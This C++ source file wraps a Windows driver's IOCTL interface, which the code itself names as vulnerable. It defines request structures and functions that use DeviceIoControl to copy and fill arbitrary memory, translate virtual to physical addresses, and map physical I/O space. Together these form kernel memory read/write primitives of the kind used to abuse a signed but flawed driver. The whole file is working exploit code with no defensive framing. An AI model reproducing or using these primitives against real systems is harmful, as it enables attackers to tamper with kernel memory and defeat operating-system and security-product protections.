#include "vulndriver.h"
#define VULNURABLE_IOCTLCODE 0x80862007


typedef struct _COPYMEMORY_BUFFER{
	ULONG64 CaseNumber;
	ULONG64 Reserved;
	ULONG64 SourceAddress;
	ULONG64 DestinationAddress;
	ULONG64 CopyLength;
}COPYMEMORY_BUFFER, *PCOPYMEMORY_BUFFER;

typedef struct _FILLMEMORY_BUFFER{
	ULONG64 CaseNumber;
	ULONG64 Reserved1;
	ULONG ValueToFillWith;
	ULONG Reserved2;
	ULONG64 FillAddress;
	ULONG64 FillLength;
}FILLMEMORY_BUFFER, * PFILLMEMORY_BUFFER;

typedef struct _GETPHYSICAL_ADDRESS_BUFFER{
	ULONG64 CaseNumber;
	ULONG64 Reserved;
	ULONG64 ReturnPhysicalAddress;
	ULONG64 VirtualAddressToTranslate;
}GETPHYSICAL_ADDRESS_BUFFER, * PGETPHYSICAL_ADDRESS_BUFFER;

typedef struct _MAPIOSPACE_BUFFER{
	ULONG64 CaseNumber;
	ULONG64 Reserved;
	ULONG64 ReturnValue;
	ULONG64 ReturnVirtualAddress;
	ULONG64 MappingPhysicalAddress;
	ULONG MappingSize;
}MAPIOSPACE_BUFFER, * PMAPIOSPACE_BUFFER;

typedef struct _UNMAPIOSPACE_BUFFER{
	ULONG64 CaseNumber;
	ULONG64 Reserved1;
	ULONG64 Reserved2;
	ULONG64 VirtualBaseAddress;
	ULONG64 Reserved3;
	ULONG MappingSize;
}UNMAPIOSPACE_BUFFER, * PUNMAPIOSPACE_BUFFER;


BOOL VulnurableDriver::IoctlFunctions::MemoryCopy(HANDLE* DeviceHandle, PVOID DestinationAddress, PVOID SourceAddress, ULONG64 CopySize) {
	if (DeviceHandle == NULL || *DeviceHandle == NULL || *DeviceHandle == INVALID_HANDLE_VALUE || DestinationAddress == NULL || SourceAddress == NULL || CopySize == NULL) {
		return FALSE;
	}
	COPYMEMORY_BUFFER InputBuffer = { 0 };
	DWORD BytesReturned = 0;
	InputBuffer.CaseNumber = 0x33;
	InputBuffer.SourceAddress = (ULONG64)SourceAddress;
	InputBuffer.DestinationAddress = (ULONG64)DestinationAddress;
	InputBuffer.CopyLength = CopySize;
	return DeviceIoControl(*DeviceHandle, VULNURABLE_IOCTLCODE, &InputBuffer, sizeof(InputBuffer), NULL, 0, &BytesReturned, NULL);
}


BOOL VulnurableDriver::IoctlFunctions::MemoryFill(HANDLE* DeviceHandle, PVOID FillAddress, ULONG FillValue, ULONG64 FillSize) {
	if (DeviceHandle == NULL || *DeviceHandle == NULL || *DeviceHandle == INVALID_HANDLE_VALUE || FillAddress == NULL || FillSize == 0) {
		return FALSE;
	}
	FILLMEMORY_BUFFER InputBuffer = { 0 };
	DWORD BytesReturned = 0;
	InputBuffer.CaseNumber = 0x30;
	InputBuffer.FillAddress = (ULONG64)FillAddress;
	InputBuffer.FillLength = FillSize;
	InputBuffer.ValueToFillWith = FillValue;
	return DeviceIoControl(*DeviceHandle, VULNURABLE_IOCTLCODE, &InputBuffer, sizeof(InputBuffer), NULL, 0, &BytesReturned, NULL);
}


BOOL VulnurableDriver::IoctlFunctions::VirtualToPhysical(HANDLE* DeviceHandle, PVOID VirtualAddress, PVOID* PhysicalAddress) {
	if (DeviceHandle == NULL || *DeviceHandle == NULL || *DeviceHandle == INVALID_HANDLE_VALUE || VirtualAddress == NULL || PhysicalAddress == NULL) {
		return FALSE;
	}
	GETPHYSICAL_ADDRESS_BUFFER InputBuffer = { 0 };
	DWORD BytesReturned = 0;
	InputBuffer.CaseNumber = 0x25;
	InputBuffer.VirtualAddressToTranslate = (ULONG64)VirtualAddress;

	if (!DeviceIoControl(*DeviceHandle, VULNURABLE_IOCTLCODE, &InputBuffer, sizeof(InputBuffer), NULL, 0, &BytesReturned, NULL)) {
		return FALSE;
	}
	*PhysicalAddress = (PVOID)InputBuffer.ReturnPhysicalAddress;
	return TRUE;
}


PVOID VulnurableDriver::IoctlFunctions::MapIoSpace(HANDLE* DeviceHandle, PVOID PhysicalAddress, ULONG MappingSize) {
	if (DeviceHandle == NULL || *DeviceHandle == NULL || *DeviceHandle == INVALID_HANDLE_VALUE || PhysicalAddress == NULL || MappingSize == 0) {
		return FALSE;
	}
	MAPIOSPACE_BUFFER InputBuffer = { 0 };
	DWORD BytesReturned = 0;
	InputBuffer.CaseNumber = 0x19;
	InputBuffer.MappingPhysicalAddress = (ULONG64)PhysicalAddress;
	InputBuffer.MappingSize = MappingSize;


	if (!DeviceIoControl(*DeviceHandle, VULNURABLE_IOCTLCODE, &InputBuffer, sizeof(InputBuffer), NULL, 0, &BytesReturned, NULL)) {
		return FALSE;
	}
	return (PVOID)InputBuffer.ReturnVirtualAddress;
}


BOOL VulnurableDriver::IoctlFunctions::UnmapIoSpace(HANDLE* DeviceHandle, PVOID MappingAddress, ULONG MappingSize) {
	if (DeviceHandle == NULL || *DeviceHandle == NULL || *DeviceHandle == INVALID_HANDLE_VALUE || MappingAddress == NULL || MappingSize == 0) {
		return FALSE;
	}
	UNMAPIOSPACE_BUFFER InputBuffer = { 0 };
	DWORD BytesReturned = 0;
	InputBuffer.CaseNumber = 0x1A;
	InputBuffer.VirtualBaseAddress = (ULONG64)MappingAddress;
	InputBuffer.MappingSize = MappingSize;
	return DeviceIoControl(*DeviceHandle, VULNURABLE_IOCTLCODE, &InputBuffer, sizeof(InputBuffer), NULL, 0, &BytesReturned, NULL);
}

